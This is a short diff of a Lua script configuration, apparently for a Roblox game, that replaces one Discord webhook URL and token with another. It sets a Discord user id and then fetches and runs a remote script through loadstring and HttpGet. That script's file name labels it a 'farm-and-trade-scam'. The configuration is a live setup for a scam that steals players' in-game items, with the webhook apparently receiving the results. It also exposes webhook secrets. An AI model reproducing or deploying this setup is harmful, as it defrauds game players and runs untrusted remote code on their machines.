@@ -1,5 +1,5 @@
 Username = "Ops_MyBadXD"
-Webhook = "https://discord.com/api/webhooks/1397202467661545653/QqmouDcsSYCuZnlKbimUVBQTBIpVaLsXaGgGP0SPygo34hmFkIvrIUVLTLYqyFig77kF"
+Webhook = "https://discord.com/api/webhooks/1398591226726453299/WM8bZe87NvonLOxPfj9aVqSMpFmsrFDDu8h6m-fjLE8qKgDVspf4WOO1aRaXEd_WhF1H"
 discuser = "878305436430901248"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Mm2-trade-/refs/heads/main/Beach-ball%20farm-and-trade-scam.txt"))()
